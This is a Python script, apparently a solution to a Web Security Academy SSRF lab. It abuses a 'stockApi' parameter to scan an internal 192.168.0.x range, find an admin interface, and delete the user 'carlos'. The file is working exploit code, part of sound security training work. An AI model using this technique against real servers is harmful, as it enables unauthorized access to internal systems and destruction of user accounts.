import sys
import requests
from requests.adapters import HTTPAdapter, Retry



def find_admin_interface(url, session):
    try:

        for i in range(1, 256):
            admin_interface_url = f"http://192.168.0.{i}:8080/admin"
            response = session.post(f"{url}/product/stock", data={"stockApi": admin_interface_url}, timeout=10)
            if response.status_code == 200:
                return admin_interface_url

    except requests.exceptions.Timeout:
        print("(-) Request timed out. Please check your URL and try again.")
        sys.exit(1)

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")
        sys.exit(1)


def delete_carlos_user(url, session, admin_interface_url):
    # Deleting Carlos user
    session.post(f"{url}/product/stock", data={"stockApi": f"{admin_interface_url}/delete?username=carlos"}, allow_redirects=False)

    # Verifying Carlos's account has been deleted
    response = session.post(f"{url}/product/stock", data={"stockApi": admin_interface_url})
    return "carlos" not in response.text and response.status_code == 200


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)


    url = sys.argv[1].rstrip("/")
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

    print("(+) Finding admin interface...")
    admin_interface_url = find_admin_interface(url, session)
    if admin_interface_url:
        print(f"(+) Admin interface found at: {admin_interface_url}")
    else:
        print("(-) Admin interface not found.")
        sys.exit(1)

    print("(+) Deleting the user \"carlos\"...")
    if delete_carlos_user(url, session, admin_interface_url):
        print("(+) Successfully deleted the user \"carlos\"!")
    else:
        print("(-) The user \"carlos\" was not successfully deleted. Please check your URL and try again.")


if __name__ == "__main__":
    main()